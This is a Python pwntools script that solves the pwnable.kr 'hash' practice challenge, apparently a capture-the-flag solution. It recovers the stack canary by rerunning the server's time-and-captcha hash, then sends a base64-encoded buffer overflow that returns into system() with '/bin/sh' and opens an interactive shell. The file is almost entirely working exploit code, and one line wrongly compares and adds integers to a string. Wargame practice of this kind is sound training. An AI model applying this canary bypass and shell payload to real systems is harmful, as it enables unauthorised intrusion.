from pwn import *
import time
import os

io = remote("pwnable.kr", 9002)
context.log_level = 'debug'

system_addr = 0x08049187
g_buf = 0x0804B0E0

t = int(time.time())
io.recvuntil("captcha")
captcha = io.recvline()
captchapos = captcha.find(' : ')+len(' : ')
captcha = captcha[captchapos:].strip()
io.sendline(captcha)
io.recvline()
io.recvline()

cmd = "./hash_cal %s %s" % (t, captcha)
canary = "0x" + os.popen(cmd).read().strip()
if canary < 0:
	canary += 0x100000000

payload = 'A' * 512 # 512 byte v3
payload += p32(int(canary, 16)) # canary
payload += 'A' * 12 # padding
payload += p32(system_addr)  # system
payload += p32(g_buf + 537*4/3)  # .bss => address of /bin/sh, 537 = 512 + 4 + 12 + 4 + 4 + 1(b64e)
payload = b64e(payload) # base64encode calc the address need *4/3
payload += "/bin/sh\x00"

io.sendline(payload)
io.interactive()